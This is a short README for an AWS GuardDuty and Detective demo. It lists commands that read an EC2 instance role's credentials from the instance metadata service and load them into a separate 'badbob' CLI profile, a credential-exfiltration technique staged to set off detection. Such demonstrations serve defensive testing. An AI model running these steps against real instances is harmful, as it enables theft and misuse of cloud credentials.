# aws-guardduty-demo
Demo for AWS GuardDuty and Detective

Rest of the Details can be found here: https://dev.to/aws-builders/aws-guard-duty-1bkh

Command for EC2 Credential Exfiltration (Change ec2-admin with the correct IAM Instance Role) 
```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin
```

This depends on your EC2 IMDS (Instance Metadata Service) version. Details: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html#instance-metadata-security-credentials

To set this role credentials in another terminal:
```
aws configure set profile.badbob.region us-east-1
aws configure set profile.badbob.aws_access_key_id <AccessKeyId>
aws configure set profile.badbob.aws_secret_access_key <SecretAccessKey>
aws configure set profile.badbob.aws_session_token <Token>
export AWS_DEFAULT_PROFILE=badbob
```
